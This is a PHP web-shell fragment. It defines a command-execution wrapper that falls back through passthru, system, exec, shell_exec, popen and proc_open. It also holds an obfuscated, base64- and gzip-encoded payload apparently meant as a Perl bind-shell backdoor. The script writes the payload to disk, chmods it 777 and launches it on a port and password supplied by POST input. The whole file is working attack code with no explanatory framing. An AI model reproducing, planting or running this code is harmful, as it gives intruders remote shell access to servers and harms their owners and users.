<?php
function Exe($command)
{
	$exec=$output='';
	$dep[]=array('pipe','r');$dep[]=array('pipe','w');
	if(function_exists('passthru')){ob_start();@passthru($command);$exec=ob_get_contents();ob_clean();ob_end_clean();}
	elseif(function_exists('system')){$tmp=ob_get_contents();ob_clean();@system($command);$output=ob_get_contents();ob_clean();$exec=$tmp;}
	elseif(function_exists('exec')){@exec($command,$output);$output=join("\n",$output);$exec=$output;}
	elseif(function_exists('shell_exec'))$exec=@shell_exec($command);
	elseif(function_exists('popen')){$output=@popen($command,'r');while(!feof($output)){$exec=fgets($output);}pclose($output);}
	elseif(function_exists('proc_open')){$res=@proc_open($command,$dep,$pipes);while(!feof($pipes[1])){$line=fgets($pipes[1]);$output.=$line;}
	$exec=$output;proc_close($res);}

	return $exec;
}

function tulis($file,$text)
{ 
	$textz = gzinflate(base64_decode($text)); 
	if($filez = @fopen($file,"w")) 
	{ 
		@fputs($filez,$textz); @fclose($file);
	} 
}

$port_bind_bd_pl="ZZJhT8IwEIa/k/AfjklgS2aA+BFmJDB1cW5kHSZGzTK2Qxpmu2wlYoD/bruBIfitd33uvXuvvWr1 

NmXRW1DWy7HImo02ebRd19Kq1CIuV3BNtWGzQZeg342DhxcYwcCAHeCWCn1gDOEgi1yHhLYXzfwg tNqKeut/yKJNiUB4skYhg3ZecMETnlmfKKrz4ofFX6h3RZJ3DUmUFaoTszO7jxzPDs0O8SdPEQkD 

e/xs/gkYsN9DShG0ScwEJAXGAqGufmdq2hKFCnmu1IjvRkpH6hE/Cuw5scfTaWAOVE9pM5WMouM0 LSLK9HM3puMpNhp7r8ZFW54jg5wXx5YZLQUyKXVzwdUXZ+T3imYoV9ds7JqNOElQTjnxPc8kRrVo 

vaW3c5paS16sjZo6qTEuQKU1UO/RSnFJGaagcFVbjUTCqeOZ2qijNLWzrD8PTe32X9oOgvM0bjGB +hecfOQFlT4UcLSkmI1ceY3VrpKMy9dWUCVCBfTlQX6Owy8=";  

$port = trim($_POST['port']); 
$passwrd = trim($_POST['bind_pass']); 
tulis("bdp",$port_bind_bd_pl); 
Exe("chmod 777 bdp"); 
$p2=which("perl"); 
Exe($p2." bdp ".$port." &"); 
$scan = Exe("ps aux"); 

?>